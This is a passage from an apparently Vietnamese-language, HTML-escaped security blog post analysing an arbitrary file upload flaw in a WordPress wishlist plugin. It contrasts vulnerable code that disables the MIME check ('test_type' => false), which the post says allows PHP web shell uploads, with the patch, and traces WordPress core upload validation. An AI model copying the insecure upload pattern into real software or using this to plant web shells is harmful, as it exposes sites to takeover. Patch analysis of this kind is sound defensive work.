1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;function tinvwl_upload_file_wc_fields_factory( $file ) {&#xA;&#x9;if ( ! function_exists( &amp;#39;wp_handle_upload&amp;#39; ) ) {&#xA;&#x9;&#x9;require_once( ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39; );&#xA;&#x9;}&#xA;&#x9;$upload = wp_handle_upload(&#xA;&#x9;&#x9;$file,&#xA;&#x9;&#x9;[&#xA;&#x9;&#x9;&#x9;&amp;#39;test_form&amp;#39; =&amp;gt; false,&#xA;&#x9;&#x9;&#x9;&amp;#39;test_type&amp;#39; =&amp;gt; false,&#xA;&#x9;&#x9;]&#xA;&#x9;);&#xA;&#xA;&#x9;return $upload;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi, hàm &lt;code&gt;tinvwl_upload_file_wc_fields_factory()&lt;/code&gt; gọi đến &lt;code&gt;wp_handle_upload()&lt;/code&gt; để upload file vào thư mục upload chính thức của WordPress (&lt;code&gt;wp-content/uploads/&amp;lt;year&amp;gt;/&amp;lt;month&amp;gt;/&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Tuy nhiên, tùy chọn &lt;code&gt;test_type =&amp;gt; false&lt;/code&gt; khiến WordPress &lt;strong&gt;bỏ qua việc kiểm tra MIME Type&lt;/strong&gt; dựa trên whitelist hợp lệ.&#xA;Điều này cho phép kẻ tấn công &lt;strong&gt;upload các tệp nguy hiểm như web shell &lt;code&gt;.php&lt;/code&gt;&lt;/strong&gt; lên máy chủ.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;function tinvwl_upload_file_wc_fields_factory( $file ) {&#xA;&#x9;if ( ! function_exists( &amp;#39;wp_handle_upload&amp;#39; ) ) {&#xA;&#x9;&#x9;require_once( ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39; );&#xA;&#x9;}&#xA;&#x9;$upload = wp_handle_upload(&#xA;&#x9;&#x9;$file,&#xA;&#x9;&#x9;[&#xA;&#x9;&#x9;&#x9;&amp;#39;test_form&amp;#39; =&amp;gt; false,&#xA;&#x9;&#x9;]&#xA;&#x9;);&#xA;&#xA;&#x9;return $upload;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá loại bỏ tùy chọn &lt;code&gt;&#39;test_type&#39; =&amp;gt; false&lt;/code&gt;, nên mặc định &lt;code&gt;&#39;test_type&#39; =&amp;gt; true&lt;/code&gt; kích hoạt kiểm tra MIME theo whitelist, ngăn upload tệp nguy hiểm như web shell &lt;code&gt;.php&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;div class=&#34;details admonition question open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-circle-question&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Câu hỏi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Trước khi tiến hành trace, tôi muốn tìm hiểu hàm &lt;code&gt;wp_handle_upload()&lt;/code&gt;, tìm đáp án cho 2 câu hỏi:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Vì sao loại bỏ &lt;code&gt;&#39;test_type&#39; =&amp;gt; false&lt;/code&gt; lại kích hoạt kiểm tra MIME theo whitelist?&lt;/li&gt;&#xA;&lt;li&gt;Whilelist đó bao gồm những gì?&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_handle_upload/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;wp_handle_upload()&lt;/a&gt; là wrapper của hàm &lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_handle_upload/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;_wp_handle_upload()&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wp_handle_upload( &amp;amp;$file, $overrides = false, $time = null ) {&#xA;&#x9;/*&#xA;&#x9; *  $_POST[&amp;#39;action&amp;#39;] must be set and its value must equal $overrides[&amp;#39;action&amp;#39;]&#xA;&#x9; *  or this:&#xA;&#x9; */&#xA;&#x9;$action = &amp;#39;wp_handle_upload&amp;#39;;&#xA;&#x9;if ( isset( $overrides[&amp;#39;action&amp;#39;] ) ) {&#xA;&#x9;&#x9;$action = $overrides[&amp;#39;action&amp;#39;];&#xA;&#x9;}&#xA;&#xA;&#x9;return _wp_handle_upload( $file, $overrides, $time, $action );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_handle_upload()&lt;/code&gt; thiết lập &lt;code&gt;$action&lt;/code&gt; và gọi đến &lt;code&gt;_wp_handle_upload()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong file chứa &lt;code&gt;_wp_handle_upload()&lt;/code&gt;, dòng &lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-admin/includes/file.php#L915&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;915&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$test_type = isset( $overrides[&amp;#39;test_type&amp;#39;] ) ? $overrides[&amp;#39;test_type&amp;#39;] : true;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Gán giá trị cho biến &lt;code&gt;$test_type&lt;/code&gt; - nếu trong &lt;code&gt;$overrides&lt;/code&gt; có key &lt;code&gt;&#39;test_type&#39;&lt;/code&gt; thì dùng giá trị đó,&#xA;ngược lại thì mặc định là &lt;code&gt;true&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Tức khi ta không truyền &lt;code&gt;test_type&lt;/code&gt; hoặc truyền &lt;code&gt;test_type =&amp;gt; true&lt;/code&gt; thì &lt;code&gt;$test_type&lt;/code&gt; là &lt;code&gt;true&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tại dòng &lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-admin/includes/file.php#L953-L973&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;953-973&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $test_type ) {&#xA;    $wp_filetype     = wp_check_filetype_and_ext( $file[&amp;#39;tmp_name&amp;#39;], $file[&amp;#39;name&amp;#39;], $mimes );&#xA;    $ext             = empty( $wp_filetype[&amp;#39;ext&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;ext&amp;#39;];&#xA;    $type            = empty( $wp_filetype[&amp;#39;type&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;type&amp;#39;];&#xA;    $proper_filename = empty( $wp_filetype[&amp;#39;proper_filename&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;proper_filename&amp;#39;];&#xA;&#xA;    // Check to see if wp_check_filetype_and_ext() determined the filename was incorrect.&#xA;    if ( $proper_filename ) {&#xA;        $file[&amp;#39;name&amp;#39;] = $proper_filename;&#xA;    }&#xA;&#xA;    if ( ( ! $type || ! $ext ) &amp;amp;&amp;amp; ! current_user_can( &amp;#39;unfiltered_upload&amp;#39; ) ) {&#xA;        return call_user_func_array( $upload_error_handler, array( &amp;amp;$file, __( &amp;#39;Sorry, you are not allowed to upload this file type.&amp;#39; ) ) );&#xA;    }&#xA;&#xA;    if ( ! $type ) {&#xA;        $type = $file[&amp;#39;type&amp;#39;];&#xA;    }&#xA;} else {&#xA;    $type = &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu &lt;code&gt;$test_type = true&lt;/code&gt;, hàm sẽ gọi &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt; để kiểm tra &lt;strong&gt;đuôi file&lt;/strong&gt; và &lt;strong&gt;MIME type&lt;/strong&gt; dựa trên danh sách hợp lệ (whitelist) của WordPress.&#xA;Nếu file không có đuôi hoặc MIME type hợp lệ, và người dùng không có quyền đặc biệt (&lt;code&gt;unfiltered_upload&lt;/code&gt;), hệ thống sẽ &lt;strong&gt;từ chối upload&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3089-L3315&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Lines 3089-3315&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wp_check_filetype_and_ext( $file, $filename, $mimes = null ) {&#xA;&#x9;$proper_filename = false;&#xA;&#xA;&#x9;// Do basic extension validation and MIME mapping.&#xA;&#x9;$wp_filetype = wp_check_filetype( $filename, $mimes );&#xA;    ...&#xA;    // Validate image types.&#xA;    // Validate files that didn&amp;#39;t get validated during previous checks.&#xA;    // The mime type must be allowed.&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt; gọi đến &lt;code&gt;wp_check_filetype()&lt;/code&gt; để thực hiện xác thực phần mở rộng cơ bản và ánh xạ MIME.&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3045-L3062&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Line 3045-3062&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wp_check_filetype( $filename, $mimes = null ) {&#xA;&#x9;if ( empty( $mimes ) ) {&#xA;&#x9;&#x9;$mimes = get_allowed_mime_types();&#xA;&#x9;}&#xA;&#x9;$type = false;&#xA;&#x9;$ext  = false;&#xA;&#xA;&#x9;foreach ( $mimes as $ext_preg =&amp;gt; $mime_match ) {&#xA;&#x9;&#x9;$ext_preg = &amp;#39;!\.(&amp;#39; . $ext_preg . &amp;#39;)$!i&amp;#39;;&#xA;&#x9;&#x9;if ( preg_match( $ext_preg, $filename, $ext_matches ) ) {&#xA;&#x9;&#x9;&#x9;$type = $mime_match;&#xA;&#x9;&#x9;&#x9;$ext  = $ext_matches[1];&#xA;&#x9;&#x9;&#x9;break;&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;return compact( &amp;#39;ext&amp;#39;, &amp;#39;type&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_check_filetype()&lt;/code&gt; chỉ kiểm tra đuôi file (extension) dựa trên whitelist MIME của WordPress - không xác minh nội dung thật của file&lt;/p&gt;&#xA;&lt;p&gt;Hàm gọi đến &lt;code&gt;get_allowed_mime_types()&lt;/code&gt; để lấy danh sách MIME Types&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3640-L3661&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Line 3640-3661&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function get_allowed_mime_types( $user = null ) {&#xA;&#x9;$t = wp_get_mime_types();&#xA;&#xA;&#x9;unset( $t[&amp;#39;swf&amp;#39;], $t[&amp;#39;exe&amp;#39;] );&#xA;&#x9;if ( function_exists( &amp;#39;current_user_can&amp;#39; ) ) {&#xA;&#x9;&#x9;$unfiltered = $user ? user_can( $user, &amp;#39;unfiltered_html&amp;#39; ) : current_user_can( &amp;#39;unfiltered_html&amp;#39; );&#xA;&#x9;}&#xA;&#xA;&#x9;if ( empty( $unfiltered ) ) {&#xA;&#x9;&#x9;unset( $t[&amp;#39;htm|html&amp;#39;], $t[&amp;#39;js&amp;#39;] );&#xA;&#x9;}&#xA;&#xA;&#x9;/**&#xA;&#x9; * Filters the list of allowed mime types and file extensions.&#xA;&#x9; *&#xA;&#x9; * @since 2.0.0&#xA;&#x9; *&#xA;&#x9; * @param array            $t    Mime types keyed by the file extension regex corresponding to those types.&#xA;&#x9; * @param int|WP_User|null $user User ID, User object or null if not provided (indicates current user).&#xA;&#x9; */&#xA;&#x9;return apply_filters( &amp;#39;upload_mimes&amp;#39;, $t, $user );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_get_mime_types()&lt;/code&gt; được gọi sẽ trả về danh sách MIME Types thật sự được chấp nhận&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3430-L3557&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Line 3430-3557&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wp_get_mime_types() {&#xA;&#x9;/**&#xA;&#x9; * Filters the list of mime types and file extensions.&#xA;&#x9; *&#xA;&#x9; * This filter should be used to add, not remove, mime types. To remove&#xA;&#x9; * mime types, use the &amp;#39;upload_mimes&amp;#39; filter.&#xA;&#x9; *&#xA;&#x9; * @since 3.5.0&#xA;&#x9; *&#xA;&#x9; * @param string[] $wp_get_mime_types Mime types keyed by the file extension regex&#xA;&#x9; *                                    corresponding to those types.&#xA;&#x9; */&#xA;&#x9;return apply_filters(&#xA;&#x9;&#x9;&amp;#39;mime_types&amp;#39;,&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;// Image formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;jpg|jpeg|jpe&amp;#39;                 =&amp;gt; &amp;#39;image/jpeg&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;gif&amp;#39;                          =&amp;gt; &amp;#39;image/gif&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;png&amp;#39;                          =&amp;gt; &amp;#39;image/png&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;bmp&amp;#39;                          =&amp;gt; &amp;#39;image/bmp&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;tiff|tif&amp;#39;                     =&amp;gt; &amp;#39;image/tiff&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;webp&amp;#39;                         =&amp;gt; &amp;#39;image/webp&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;avif&amp;#39;                         =&amp;gt; &amp;#39;image/avif&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ico&amp;#39;                          =&amp;gt; &amp;#39;image/x-icon&amp;#39;,&#xA;&#xA;&#x9;&#x9;&#x9;// TODO: Needs improvement. All images with the following mime types seem to have .heic file extension.&#xA;&#x9;&#x9;&#x9;&amp;#39;heic&amp;#39;                         =&amp;gt; &amp;#39;image/heic&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;heif&amp;#39;                         =&amp;gt; &amp;#39;image/heif&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;heics&amp;#39;                        =&amp;gt; &amp;#39;image/heic-sequence&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;heifs&amp;#39;                        =&amp;gt; &amp;#39;image/heif-sequence&amp;#39;,&#xA;&#xA;&#x9;&#x9;&#x9;// Video formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;asf|asx&amp;#39;                      =&amp;gt; &amp;#39;video/x-ms-asf&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wmv&amp;#39;                          =&amp;gt; &amp;#39;video/x-ms-wmv&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wmx&amp;#39;                          =&amp;gt; &amp;#39;video/x-ms-wmx&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wm&amp;#39;                           =&amp;gt; &amp;#39;video/x-ms-wm&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;avi&amp;#39;                          =&amp;gt; &amp;#39;video/avi&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;divx&amp;#39;                         =&amp;gt; &amp;#39;video/divx&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;flv&amp;#39;                          =&amp;gt; &amp;#39;video/x-flv&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mov|qt&amp;#39;                       =&amp;gt; &amp;#39;video/quicktime&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mpeg|mpg|mpe&amp;#39;                 =&amp;gt; &amp;#39;video/mpeg&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mp4|m4v&amp;#39;                      =&amp;gt; &amp;#39;video/mp4&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ogv&amp;#39;                          =&amp;gt; &amp;#39;video/ogg&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;webm&amp;#39;                         =&amp;gt; &amp;#39;video/webm&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mkv&amp;#39;                          =&amp;gt; &amp;#39;video/x-matroska&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;3gp|3gpp&amp;#39;                     =&amp;gt; &amp;#39;video/3gpp&amp;#39;,  // Can also be audio.&#xA;&#x9;&#x9;&#x9;&amp;#39;3g2|3gp2&amp;#39;                     =&amp;gt; &amp;#39;video/3gpp2&amp;#39;, // Can also be audio.&#xA;&#x9;&#x9;&#x9;// Text formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;txt|asc|c|cc|h|srt&amp;#39;           =&amp;gt; &amp;#39;text/plain&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;csv&amp;#39;                          =&amp;gt; &amp;#39;text/csv&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;tsv&amp;#39;                          =&amp;gt; &amp;#39;text/tab-separated-values&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ics&amp;#39;                          =&amp;gt; &amp;#39;text/calendar&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;rtx&amp;#39;                          =&amp;gt; &amp;#39;text/richtext&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;css&amp;#39;                          =&amp;gt; &amp;#39;text/css&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;htm|html&amp;#39;                     =&amp;gt; &amp;#39;text/html&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;vtt&amp;#39;                          =&amp;gt; &amp;#39;text/vtt&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;dfxp&amp;#39;                         =&amp;gt; &amp;#39;application/ttaf&amp;#43;xml&amp;#39;,&#xA;&#x9;&#x9;&#x9;// Audio formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;mp3|m4a|m4b&amp;#39;                  =&amp;gt; &amp;#39;audio/mpeg&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;aac&amp;#39;                          =&amp;gt; &amp;#39;audio/aac&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ra|ram&amp;#39;                       =&amp;gt; &amp;#39;audio/x-realaudio&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wav|x-wav&amp;#39;                    =&amp;gt; &amp;#39;audio/wav&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ogg|oga&amp;#39;                      =&amp;gt; &amp;#39;audio/ogg&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;flac&amp;#39;                         =&amp;gt; &amp;#39;audio/flac&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mid|midi&amp;#39;                     =&amp;gt; &amp;#39;audio/midi&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wma&amp;#39;                          =&amp;gt; &amp;#39;audio/x-ms-wma&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wax&amp;#39;                          =&amp;gt; &amp;#39;audio/x-ms-wax&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mka&amp;#39;                          =&amp;gt; &amp;#39;audio/x-matroska&amp;#39;,&#xA;&#x9;&#x9;&#x9;// Misc application formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;rtf&amp;#39;                          =&amp;gt; &amp;#39;application/rtf&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;js&amp;#39;                           =&amp;gt; &amp;#39;application/javascript&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;pdf&amp;#39;                          =&amp;gt; &amp;#39;application/pdf&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;swf&amp;#39;                          =&amp;gt; &amp;#39;application/x-shockwave-flash&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;class&amp;#39;                        =&amp;gt; &amp;#39;application/java&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;tar&amp;#39;                          =&amp;gt; &amp;#39;application/x-tar&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;zip&amp;#39;                          =&amp;gt; &amp;#39;application/zip&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;gz|gzip&amp;#39;                      =&amp;gt; &amp;#39;application/x-gzip&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;rar&amp;#39;                          =&amp;gt; &amp;#39;application/rar&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;7z&amp;#39;                           =&amp;gt; &amp;#39;application/x-7z-compressed&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;exe&amp;#39;                          =&amp;gt; &amp;#39;application/x-msdownload&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;psd&amp;#39;                          =&amp;gt; &amp;#39;application/octet-stream&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xcf&amp;#39;                          =&amp;gt; &amp;#39;application/octet-stream&amp;#39;,&#xA;&#x9;&#x9;&#x9;// MS Office formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;doc&amp;#39;                          =&amp;gt; &amp;#39;application/msword&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;pot|pps|ppt&amp;#39;                  =&amp;gt; &amp;#39;application/vnd.ms-powerpoint&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wri&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.ms-write&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xla|xls|xlt|xlw&amp;#39;              =&amp;gt; &amp;#39;application/vnd.ms-excel&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mdb&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.ms-access&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mpp&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.ms-project&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;docx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;docm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-word.document.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;dotx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.wordprocessingml.template&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;dotm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-word.template.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xlsx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xlsm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-excel.sheet.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xlsb&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-excel.sheet.binary.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xltx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.spreadsheetml.template&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xltm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-excel.template.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xlam&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-excel.addin.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;pptx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.presentationml.presentation&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;pptm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-powerpoint.presentation.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ppsx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.presentationml.slideshow&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ppsm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-powerpoint.slideshow.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;potx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.presentationml.template&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;potm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-powerpoint.template.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ppam&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-powerpoint.addin.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;sldx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.presentationml.slide&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;sldm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-powerpoint.slide.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;onetoc|onetoc2|onetmp|onepkg&amp;#39; =&amp;gt; &amp;#39;application/onenote&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;oxps&amp;#39;                         =&amp;gt; &amp;#39;application/oxps&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xps&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.ms-xpsdocument&amp;#39;,&#xA;&#x9;&#x9;&#x9;// OpenOffice formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;odt&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.text&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;odp&amp;#39;                          =&amp;gt; 